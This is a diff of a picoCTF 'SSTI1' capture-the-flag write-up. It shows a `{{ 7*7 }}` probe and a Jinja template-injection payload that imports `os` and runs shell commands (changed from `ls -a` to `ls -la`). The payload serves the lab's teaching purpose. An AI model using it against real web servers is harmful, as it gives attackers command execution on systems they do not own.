@@ -13,12 +13,13 @@ https://play.picoctf.org/practice/challenge/492 (SSTI1)
 ![alt text](image-1.png)
 
 It was build using python and most likely a jinja template. We can try a very generic payload to test it. `{{ 7*7 }}` is our payload and it returns 49
+
 ![alt text](image-3.png)
 
 ![alt text](image-2.png)
 
 2. Now since we are sure its a Jinja Template, we can use our payload to actually execute what we want to get our objective (flag here). 
-> `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -a').read() }}`
+> `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}`
 
 ![alt text](image-4.png)
 
